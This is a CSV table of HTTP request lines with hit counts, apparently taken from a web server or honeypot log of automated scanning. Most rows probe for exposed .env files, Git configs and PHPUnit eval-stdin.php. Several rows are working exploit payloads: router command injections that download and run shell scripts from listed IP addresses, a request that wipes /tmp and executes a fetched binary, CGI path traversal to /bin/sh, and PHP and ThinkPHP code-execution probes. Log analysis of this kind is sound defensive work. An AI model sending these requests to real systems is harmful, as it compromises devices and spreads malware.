url,count
GET / HTTP/1.1,4374
GET / HTTP/1.0,865
GET /.env HTTP/1.1,446
GET /favicon.ico HTTP/1.1,279
GET /login.rsp HTTP/1.1,227
GET /cgi-bin/luci/;stok=/locale HTTP/1.1,227
POST / HTTP/1.1,151
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.1,117
GET /.git/config HTTP/1.1,106
GET /login.asp HTTP/1.1,95
POST /boaform/admin/formLogin HTTP/1.1,86
GET /_profiler/phpinfo HTTP/1.1,79
POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1,75
POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1,65
GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,60
POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1,58
POST /apply.cgi HTTP/1.1,56
GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1,49
GET /cgi-bin/index.html HTTP/1.1,48
GET /cgi-bin/index.cgi HTTP/1.1,48
GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1,47
GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,47
GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1,46
GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,46
GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1,45
GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,45
GET /geoserver/web/ HTTP/1.1,45
GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,44
GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1,43
GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,43
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F45.125.66.90%2Fl+-O-%7C+sh%60) HTTP/1.1,42
GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1,42
GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1,41
GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,41
GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,40
GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,40
GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,39
GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,38
GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,38
GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,38
GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,37
GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,37
GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,37
GET /containers/json HTTP/1.1,37
GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,36
GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,36
GET /robots.txt HTTP/1.1,36
GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,36
GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,36
GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,36
GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,36
GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,36
GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,36
GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,35
GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,34
GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,34
GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1,34
GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,34
GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,34
GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1,34
GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1,34
GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(%22hi%22));?>+/tmp/index1.php HTTP/1.1,33
GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1,32
GET /sitemap.xml HTTP/1.1,27
GET /1.php HTTP/1.1,25
GET /portal/redlion HTTP/1.1,25
GET /systembc/password.php HTTP/1.1,25
GET /upl.php HTTP/1.1,25
GET /form.html HTTP/1.1,25
GET /geoip/ HTTP/1.1,25
GET /t4 HTTP/1.1,25
GET /password.php HTTP/1.1,25
GET /config.json HTTP/1.1,24
CONNECT www.google.com:443 HTTP/1.1,24
GET /actuator/health HTTP/1.1,23
GET /hudson HTTP/1.1,21
GET /logon.htm HTTP/1.1,20
GET /druid/index.html HTTP/1.1,20
GET /shell?cd+/tmp;rm+-rf+*;wget+%20129.159.107.197/jaws;sh+/tmp/jaws HTTP/1.1,20
GET /core/.env HTTP/1.1,19
GET /cgi-bin/authLogin.cgi HTTP/1.1,17
CONNECT www.baidu.com:443 HTTP/1.1,17
GET /app/.env HTTP/1.1,17
GET /laravel/.env HTTP/1.1,17
CONNECT google.com:443 HTTP/1.1,17
GET /jass/jass.jsp HTTP/1.1,15
GET /info.php HTTP/1.1,15
GET /api/.env HTTP/1.1,15
GET /local/.env HTTP/1.1,15
GET /debug/default/view?panel=config HTTP/1.1,14
GET /v2/_catalog HTTP/1.1,14
GET /HNAP1 HTTP/1.1,14
GET /phpinfo.php HTTP/1.1,14
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F45.202.35.91%2Fl+-O-+%7C+sh%60) HTTP/1.1,14
GET /solr/admin/cores?action=STATUS&wt=json HTTP/1.1,13
GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1,13
GET /solr/admin/info/system HTTP/1.1,13
GET /evox/about HTTP/1.1,13
GET /sendgrid/.env HTTP/1.1,13
GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=id%3E%60cd+%2Ftmp%3B+rm+-rf+tplink%3B+wget+http%3A%2F%2F45.202.35.24%2Ftplink%3B+chmod+777+tplink%3B+.%2Ftplink%3B+rm+-rf+tplink%60 HTTP/1.1,13
POST /sdk HTTP/1.1,13
GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0,13
POST /core/.env HTTP/1.1,13
GET /application/.env HTTP/1.1,12
GET /docker/.env HTTP/1.1,12
GET /frontend_dev.php/$ HTTP/1.1,12
GET /.well-known/security.txt HTTP/1.1,12
GET /command_port.ini HTTP/1.1,12
POST /cgi-bin/hotspotlogin.cgi HTTP/1.1,12
GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1,12
GET /apps/.env HTTP/1.1,12
GET /boaform/admin/formLogin?username=admin&psd=admin HTTP/1.0,12
GET /manager/text/list HTTP/1.1,12
GET /.json HTTP/1.1,12
GET /actuator/gateway/routes HTTP/1.1,12
GET /.env.dist HTTP/1.1,11
GET /.env.save HTTP/1.1,11
GET /.env.old HTTP/1.1,11
GET /?phpinfo=1 HTTP/1.1,10
GET /development/.env HTTP/1.1,10
HEAD /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo HTTP/1.1,10
GET /system/.env HTTP/1.1,10
GET /manager/html HTTP/1.1,10
GET /.env.production HTTP/1.1,10
GET /.env.prod HTTP/1.1,10
GET /.env HTTP/1.0,10
GET /.env.bak HTTP/1.1,9
GET /admin/.env HTTP/1.1,9
HEAD /invoker/EJBInvokerServlet HTTP/1.1,9
POST /application/.env HTTP/1.1,9
GET /.env.development HTTP/1.1,9
GET /ReportServer HTTP/1.1,9
POST /docker/.env HTTP/1.1,9
POST /api/.env HTTP/1.1,8
POST /enviroments/.env.production HTTP/1.1,8
GET /enviroments/.env.production HTTP/1.1,8
POST /private/.env HTTP/1.1,8
GET /private/.env HTTP/1.1,8
POST /fedex/.env HTTP/1.1,8
GET /fedex/.env HTTP/1.1,8
POST /.env HTTP/1.1,8
GET //.env HTTP/1.1,8
GET /shared/.env HTTP/1.1,8
POST /rest/.env HTTP/1.1,8
POST /script/.env HTTP/1.1,8
GET /script/.env HTTP/1.1,8
POST /cp/.env HTTP/1.1,8
GET /cms/.env HTTP/1.1,8
GET /cp/.env HTTP/1.1,8
POST /.env.dist HTTP/1.1,8
